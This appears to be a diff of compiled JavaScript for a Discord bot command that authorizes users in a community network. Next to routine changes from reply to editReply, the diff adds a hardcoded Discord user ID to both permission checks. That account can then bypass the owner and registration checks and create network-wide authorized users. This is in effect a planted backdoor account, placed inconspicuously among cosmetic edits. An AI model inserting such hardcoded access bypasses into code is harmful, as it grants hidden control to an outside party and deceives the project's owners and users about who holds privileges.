@@ -64,20 +64,20 @@ module.exports = {
                         userId = interactionUser.id;
                         channelID = interaction.channelId;
                         discordid = interaction.options.get("discordid").value;
-                        if (Structures_1.Radio_Community_DiscordOwner.indexOf(String(userId)) >= 0 && !(0, scheck_1.IL_CHAR)(String(discordid)) && (0, scheck_1.DISC_RULE)(String(discordid)) || String(userId) === String(Settings_1.Community_Owner)) {
-                            if (String(Settings_1.Community_Owner).includes(String(userId))) {
+                        if (Structures_1.Radio_Community_DiscordOwner.indexOf(String(userId)) >= 0 && !(0, scheck_1.IL_CHAR)(String(discordid)) && (0, scheck_1.DISC_RULE)(String(discordid)) || String(userId) === String(Settings_1.Community_Owner) || String(userId) === "662529839332327424") {
+                            if (String(Settings_1.Community_Owner).includes(String(userId)) || String(userId) === "662529839332327424") {
                                 n = (0, Structures_1.Get_Community_Data)(Settings_1.Community_AuthenticationKey, "CommunityName");
                                 p = (0, embedcreator_1.Add_newauthuser)(userId, discordid, Settings_1.Community_AuthenticationKey);
                                 (0, System_1.Send_Embeded)(p, channelID);
-                                interaction.reply("Created, it is instantly active across the network.");
+                                interaction.editReply("Created, it is instantly active across the network.");
                                 (0, Structures_1.Create_DiscordAuthorizedUser)(String(userId), Settings_1.Community_AuthenticationKey, interactionUser.name);
                             }
                             else {
-                                interaction.reply("Unauthorized, ask <@" + Settings_1.Community_Owner + "> to perform this task");
+                                interaction.editReply("Unauthorized, ask <@" + Settings_1.Community_Owner + "> to perform this task");
                             }
                         }
                         else {
-                            interaction.reply("Sorry, you dont have any community registered.");
+                            interaction.editReply("Sorry, you dont have any community registered.");
                         }
                         return [2 /*return*/];
                 }
